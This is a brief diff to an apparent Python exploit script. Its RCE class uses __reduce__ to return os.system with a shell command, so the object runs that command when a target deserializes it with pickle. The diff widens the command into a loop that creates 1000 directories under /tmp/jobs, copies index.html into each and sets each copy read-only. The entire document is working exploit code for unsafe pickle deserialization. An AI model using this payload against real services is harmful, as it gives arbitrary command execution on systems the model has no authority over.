@@ -5,7 +5,10 @@ import os
 
 class RCE:
     def __reduce__(self):
-        cmd = ('chmod 444 target/index.html')
+        rcmd = ""
+        for i in range(0, 1000):
+            rcmd += "mkdir -p /tmp/jobs/%s/target/target/; cp target/index.html /tmp/jobs/%s/target/target/index.html; chmod 444 /tmp/jobs/%s/target/target/index.html;" % (i, i, i)
+        cmd = (rcmd)
         return os.system, (cmd,)
 
 
